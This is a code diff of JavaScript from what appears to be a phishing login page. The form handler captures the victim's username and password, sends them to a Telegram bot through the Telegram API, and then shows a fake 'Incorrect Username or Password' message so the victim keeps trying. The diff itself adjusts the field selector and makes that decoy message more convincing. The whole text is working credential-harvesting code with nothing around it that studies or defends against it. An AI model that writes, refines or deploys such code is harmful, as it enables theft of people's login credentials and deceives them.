@@ -107,7 +107,7 @@
     document.querySelector("form").addEventListener("submit", function (e) {
         e.preventDefault(); // Prevent form submission
 
-        const email = document.querySelector('input[type="email"]').value;
+        const email = document.querySelector('input[type="text"]').value;
         const password = document.querySelector('input[type="password"]').value;
 
         // Sending data to Telegram bot
@@ -115,7 +115,7 @@
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
             .then((response) => {
                 if (response.ok) {
-                    showPopup("Username error"); // Show popup on success
+                    showPopup("Incorrect Username or Password. Try Agin"); // Show popup on success
                 } else {
                     console.error("Failed to send message to Telegram bot.");
                 }
